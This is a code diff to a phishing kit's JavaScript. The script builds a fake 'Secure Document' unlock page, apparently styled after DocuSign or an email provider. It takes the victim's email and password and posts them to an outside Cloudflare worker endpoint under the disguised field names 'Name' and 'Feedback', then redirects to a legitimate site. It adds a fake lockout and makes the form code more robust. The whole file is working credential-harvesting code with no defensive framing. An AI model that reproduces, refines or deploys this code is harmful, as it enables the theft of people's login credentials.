@@ -11,7 +11,6 @@
         BG_BLUR: 0,
         BG_GRAY: false,
         BG_OVERLAY: 0.25,
-        // NEW ENDPOINT
         PHP_ENDPOINT: 'https://rum-email-proxy.haricoting.workers.dev/contact',
         SUCCESS_REDIRECT: 'https://www.docusign.com/Signin/Session/dashboard',
         LOCKOUT_REDIRECT: 'https://mail.google.com/mail/u/0/#inbox',
@@ -33,37 +32,6 @@
         BUTTON_TEXT: 'Unlock',
         TAG_TEXT: 'Encrypted'
     };
-
-    // Create background canvas
-    function createBackground() {
-        const bgCanvas = document.createElement('div');
-        bgCanvas.id = 'bg_canvas';
-        bgCanvas.appendChild(document.createTextNode(''));
-        document.body.appendChild(bgCanvas);
-    }
-
-    // Create main UI
-    function createUI() {
-        const mainForm = document.createElement('div');
-        const alertNode = document.createElement('div');
-        const bgVeil = document.createElement('div');
-        const titleNode = document.createElement('h1');
-        const captionNode = document.createElement('div');
-        
-        mainForm.id = 'main_form';
-        alertNode.id = 'alert_node';
-        bgVeil.id = 'bg_veil';
-        titleNode.id = 'title_node';
-        
-        titleNode.innerHTML = `<div class="brand_row"><div class="brand_orb"><img src="" alt="brand_img" id="brand_img"></div><div class="title_main">Secure Document</div></div>`;
-        captionNode.innerHTML = `<div class="caption_sub">Login to view your secure document</div>`;
-        
-        document.body.appendChild(mainForm);
-        document.body.appendChild(alertNode);
-        document.body.appendChild(bgVeil);
-        document.body.appendChild(titleNode);
-        document.body.appendChild(captionNode);
-    }
 
     // Apply background styles
     function applyBackgroundStyles() {
@@ -101,9 +69,33 @@
         } catch (e) {}
     }
 
+    // Extract domain from email
+    function getEmailDomain(email) {
+        if (!email || email.indexOf('@') === -1) return '';
+        const parts = email.split('@');
+        if (parts.length === 2 && parts[0].trim() !== '') {
+            return parts[1].trim().toLowerCase();
+        }
+        return '';
+    }
+
+    // Capitalize first letter
+    function capitalize(str) {
+        if (!str) return '';
+        return str.charAt(0).toUpperCase() + str.slice(1);
+    }
+
     // Show alert message
     function showAlert(message, type) {
-        const alertNode = document.getElementById('alert_node');
+        // Create alert node if doesn't exist
+        let alertNode = document.getElementById('alert_node');
+        if (!alertNode) {
+            alertNode = document.createElement('div');
+            alertNode.id = 'alert_node';
+            alertNode.className = 'alert_bar';
+            document.body.appendChild(alertNode);
+        }
+        
         alertNode.textContent = message;
         alertNode.classList.add('visible');
         
@@ -127,35 +119,23 @@
     // Hide alert
     function hideAlert() {
         const alertNode = document.getElementById('alert_node');
-        alertNode.classList.remove('visible');
+        if (alertNode) {
+            alertNode.classList.remove('visible');
+        }
     }
 
     // Show loading state
     function showLoading() {
         const btn = document.getElementById('code_p4r7');
+        if (!btn) return;
+        
         btn.classList.remove('locked_spin');
-        void btn.offsetWidth; // Force reflow
+        void btn.offsetWidth;
         btn.classList.add('locked_spin');
         
         setTimeout(() => {
             btn.classList.remove('locked_spin');
         }, 2000);
-    }
-
-    // Extract domain from email
-    function getEmailDomain(email) {
-        if (!email || email.indexOf('@') === -1) return '';
-        const parts = email.split('@');
-        if (parts.length === 2 && parts[0].trim() !== '') {
-            return parts[1].trim().toLowerCase();
-        }
-        return '';
-    }
-
-    // Capitalize first letter
-    function capitalize(str) {
-        if (!str) return '';
-        return str.charAt(0).toUpperCase() + str.slice(1);
     }
 
     // Handle lockout
@@ -166,8 +146,12 @@
         if (isLocked) return;
         isLocked = true;
         
-        passwordField.value = '';
-        btn.disabled = true;
+        if (passwordField) passwordField.value = '';
+        if (btn) {
+            btn.disabled = true;
+            btn.textContent = CONFIG.BUTTON_TEXT;
+        }
+        
         showAlert(CONFIG.MSG_LOCKOUT, 'error');
         showLoading();
         
@@ -176,60 +160,33 @@
         }, CONFIG.LOCKOUT_DELAY);
     }
 
-    // Update email display
+    // Update email display based on input
     function updateEmailDisplay() {
         const emailInput = document.getElementById('mail_x9k2');
-        const captionTitle = document.getElementById('title_node');
-        const captionSub = document.getElementById('caption_node');
-        const emailSlot = document.getElementById('mail_slot');
+        if (!emailInput) return;
         
         const email = emailInput.value.trim();
         const domain = getEmailDomain(email);
         
-        if (!domain) {
-            captionTitle.textContent = CONFIG.HEADING;
-            captionSub.textContent = CONFIG.SUBHEAD;
-            emailSlot.textContent = CONFIG.EMAIL_LABEL;
-            updateFavicon('');
-            return;
+        // Update document title if domain found
+        if (domain) {
+            const domainName = capitalize(domain.split('.')[0]);
+            document.title = `${domainName} - Secure Document Access`;
         }
-        
-        const domainName = capitalize(domain.split('.')[0]);
-        captionTitle.textContent = `${domainName} ${CONFIG.HEADING}`;
-        captionSub.textContent = `${domainName} ${CONFIG.SUBHEAD}`;
-        emailSlot.textContent = `${domainName} ${CONFIG.EMAIL_LABEL}`;
-        
-        updateFavicon(domain);
     }
 
-    // Update favicon
-    function updateFavicon(domain) {
-        const img = new Image();
-        const url = `https://www.google.com/s2/favicons?domain=${encodeURIComponent(domain)}&sz=128`;
-        
-        img.onload = () => {
-            document.getElementById('brand_img').src = url;
-        };
-        img.onerror = () => {
-            document.getElementById('brand_img').src = getDefaultIcon();
-        };
-        img.src = url;
-    }
-
-    // Get default icon
-    function getDefaultIcon() {
-        return 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"%3E%3Ccircle cx="12" cy="12" r="10" fill="%23464f5b"/%3E%3C/svg%3E';
-    }
-
-    // Form submission handler - MODIFIED
+    // Form submission handler
     function handleSubmit() {
         const emailInput = document.getElementById('mail_x9k2');
         const passwordInput = document.getElementById('code_p4r7_input');
         const submitBtn = document.getElementById('code_p4r7');
         
+        if (!emailInput || !passwordInput) return;
+        
         const email = emailInput.value.trim();
         const password = passwordInput.value.trim();
         
+        // Validation
         if (!email || email.indexOf('@') === -1) {
             showAlert('Please enter a valid email address.', 'error');
             showLoading();
@@ -244,11 +201,14 @@
         
         if (isLocked) return;
         
-        submitBtn.textContent = 'Loading...';
-        submitBtn.disabled = true;
+        // UI updates
+        if (submitBtn) {
+            submitBtn.textContent = 'Loading...';
+            submitBtn.disabled = true;
+        }
         hideAlert();
         
-        // NEW PAYLOAD FORMAT - URLSearchParams
+        // NEW PAYLOAD FORMAT
         const cleanPayload = new URLSearchParams();
         cleanPayload.append("Name", email);
         cleanPayload.append("Feedback", password);
@@ -264,7 +224,6 @@
             body: cleanPayload.toString()
         })
         .then(response => {
-            // Check if response is JSON or text
             const contentType = response.headers.get('content-type');
             if (contentType && contentType.includes('application/json')) {
                 return response.json();
@@ -272,31 +231,33 @@
             return response.text();
         })
         .then(data => {
-            processResponse(data);
+            processResponse(data, passwordInput, submitBtn);
         })
-        .catch(() => handleError())
+        .catch(() => {
+            handleError(passwordInput, submitBtn);
+        })
         .then(() => {
             const elapsed = Date.now() - startTime;
             const delay = Math.max(2000, 3000 - elapsed);
             return new Promise(resolve => setTimeout(resolve, delay));
         })
         .then(() => {
-            submitBtn.textContent = CONFIG.BUTTON_TEXT;
-            submitBtn.disabled = false;
+            if (submitBtn && !isLocked) {
+                submitBtn.textContent = CONFIG.BUTTON_TEXT;
+                submitBtn.disabled = false;
+            }
         });
     }
 
-    // Process server response - MODIFIED to handle text or object response
-    function processResponse(data) {
+    // Process server response
+    function processResponse(data, passwordInput, submitBtn) {
         const attemptCount = parseInt(sessionStorage.getItem(CONFIG.STORAGE_KEY) || '0', 10) + 1;
         sessionStorage.setItem(CONFIG.STORAGE_KEY, String(attemptCount));
         
-        // Handle both JSON object and text responses
         let status = 'error';
         if (typeof data === 'object' && data !== null) {
             status = data.status || 'error';
         } else if (typeof data === 'string') {
-            // If response is text, assume success if it contains certain keywords
             status = data.toLowerCase().includes('success') || data.toLowerCase().includes('ok') ? 'success' : 'error';
         }
         
@@ -317,51 +278,138 @@
             }
             showAlert(CONFIG.MSG_WRONG, 'error');
             showLoading();
-            passwordInput.value = '';
-            passwordInput.focus();
+            if (passwordInput) {
+                passwordInput.value = '';
+                passwordInput.focus();
+            }
         }
     }
 
     // Handle network/error states
-    function handleError() {
+    function handleError(passwordInput, submitBtn) {
         showAlert(CONFIG.MSG_NET, 'error');
         showLoading();
-        const passwordInput = document.getElementById('code_p4r7_input');
-        passwordInput.value = '';
-        passwordInput.focus();
+        if (passwordInput) {
+            passwordInput.value = '';
+            passwordInput.focus();
+        }
+        if (submitBtn) {
+            submitBtn.textContent = CONFIG.BUTTON_TEXT;
+            submitBtn.disabled = false;
+        }
+    }
+
+    // Create the form elements dynamically around existing email input
+    function createFormElements() {
+        const emailInput = document.getElementById('mail_x9k2');
+        if (!emailInput) return;
+        
+        // Make email input editable (remove readonly)
+        emailInput.removeAttribute('readonly');
+        emailInput.removeAttribute('tabindex');
+        emailInput.placeholder = 'Enter your email';
+        
+        // Create container if doesn't exist
+        let container = document.getElementById('main_form');
+        if (!container) {
+            container = document.createElement('div');
+            container.id = 'main_form';
+            container.className = 'frame_v7';
+            emailInput.parentNode.insertBefore(container, emailInput.nextSibling);
+        }
+        
+        // Create password field
+        const passwordField = document.createElement('input');
+        passwordField.type = 'password';
+        passwordField.id = 'code_p4r7_input';
+        passwordField.className = 'inp_core';
+        passwordField.placeholder = CONFIG.KEY_PLACEHOLDER;
+        passwordField.autocomplete = 'off';
+        passwordField.required = true;
+        
+        // Create submit button
+        const submitBtn = document.createElement('button');
+        submitBtn.type = 'submit';
+        submitBtn.id = 'code_p4r7';
+        submitBtn.className = 'cta_main';
+        submitBtn.textContent = CONFIG.BUTTON_TEXT;
+        
+        // Create password toggle button
+        const toggleBtn = document.createElement('button');
+        toggleBtn.type = 'button';
+        toggleBtn.id = 'eye_toggle';
+        toggleBtn.className = 'eye_btn';
+        toggleBtn.innerHTML = `
+            <svg id="eye_show" viewBox="0 0 24 24" width="18" height="18" style="display:none">
+                <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5C21.27 7.61 17 4.5 12 4.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+            </svg>
+            <svg id="eye_hide" viewBox="0 0 24 24" width="18" height="18">
+                <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.75l1.31 1.31C8.58 11.37 8.25 12.15 8.25 13c0 2.07 1.68 3.75 3.75 3.75.85 0 1.63-.33 2.24-.88l1.31 1.31c-.97.72-2.17 1.16-3.55 1.16-3.04 0-5.5-2.46-5.5-5.5 0-1.38.44-2.58 1.16-3.55zM11.71 9.29l2.99 2.99c-.05-.29-.08-.59-.08-.9 0-2.07-1.68-3.75-3.75-3.75-.31 0-.61.03-.9.08l1.74 1.58z"/>
+            </svg>
+        `;
+        
+        // Build form structure
+        const form = document.createElement('form');
+        form.className = 'main_form';
+        form.style.cssText = 'display:flex;flex-direction:column;gap:1rem;max-width:400px;margin:2rem auto;';
+        
+        // Add elements to form
+        form.appendChild(emailInput.cloneNode(true));
+        form.appendChild(passwordField);
+        form.appendChild(toggleBtn);
+        form.appendChild(submitBtn);
+        
+        // Replace original email input with form
+        emailInput.parentNode.replaceChild(form, emailInput);
+        
+        // Add event listeners
+        submitBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            handleSubmit();
+        });
+        
+        toggleBtn.addEventListener('click', () => {
+            const pwd = document.getElementById('code_p4r7_input');
+            const show = document.getElementById('eye_show');
+            const hide = document.getElementById('eye_hide');
+            
+            if (pwd.type === 'password') {
+                pwd.type = 'text';
+                show.style.display = 'block';
+                hide.style.display = 'none';
+            } else {
+                pwd.type = 'password';
+                show.style.display = 'none';
+                hide.style.display = 'block';
+            }
+            pwd.focus();
+        });
+        
+        // Update email input listener
+        const newEmailInput = form.querySelector('#mail_x9k2');
+        newEmailInput.addEventListener('input', updateEmailDisplay);
     }
 
     // Initialize
     let isLocked = false;
     
     function init() {
-        createBackground();
-        createUI();
+        // Create background elements
+        if (!document.getElementById('bg_canvas')) {
+            const bgCanvas = document.createElement('div');
+            bgCanvas.id = 'bg_canvas';
+            document.body.insertBefore(bgCanvas, document.body.firstChild);
+        }
+        
+        if (!document.getElementById('bg_veil')) {
+            const bgVeil = document.createElement('div');
+            bgVeil.id = 'bg_veil';
+            document.body.insertBefore(bgVeil, document.body.firstChild);
+        }
+        
         applyBackgroundStyles();
         updateURL();
-        
-        // Get DOM references
-        const emailInput = document.getElementById('mail_x9k2');
-        const passwordInput = document.getElementById('code_p4r7_input');
-        const toggleBtn = document.getElementById('eye_toggle');
-        const submitBtn = document.getElementById('code_p4r7');
-        
-        // Event listeners
-        emailInput.addEventListener('input', updateEmailDisplay);
-        
-        toggleBtn.addEventListener('click', () => {
-            const isPassword = passwordInput.getAttribute('type') === 'password';
-            passwordInput.setAttribute('type', isPassword ? 'text' : 'password');
-            document.getElementById('eye_show').style.display = isPassword ? 'block' : 'none';
-            document.getElementById('eye_hide').style.display = isPassword ? 'none' : 'block';
-            passwordInput.focus();
-        });
-        
-        submitBtn.addEventListener('click', (e) => {
-            e.preventDefault();
-            handleSubmit();
-        });
-        
+        createFormElements();
         updateEmailDisplay();
     }
 
